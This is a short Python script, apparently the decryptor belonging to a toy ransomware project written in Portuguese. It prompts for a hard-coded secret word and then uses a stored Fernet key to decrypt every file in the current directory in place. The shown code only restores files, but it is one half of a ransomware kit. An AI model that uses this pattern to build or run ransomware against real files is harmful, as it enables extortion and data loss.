#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

arquivos = []

for arquivo in os.listdir():

    if arquivo == "python_ransomware.py" or arquivo == "thekey.key" or arquivo == "decrypt.py":
        continue
    if os.path.isfile(arquivo):

        arquivos.append(arquivo)


print(arquivos)


with open("thekey.key", "rb") as key:
    chave_descriptografada = key.read()

palavra_secreta = "Amigo"
palavra_inserir = input("Entre aqui com a sua palavra secreta para descriptografar os arquivos: ")

if palavra_inserir == palavra_secreta:
    for arquivo in arquivos:
        with open(arquivo, "rb") as theFile:
            conteudo = theFile.read()

        conteudo_descriptografado = Fernet(chave_descriptografada).decrypt(conteudo)
        with open(arquivo, "wb") as theFile:
            theFile.write(conteudo_descriptografado)    
    print("O seu amigo lhe fez um favor e salvou seus arquivos :)")
else:
    print("Palavra errada XD")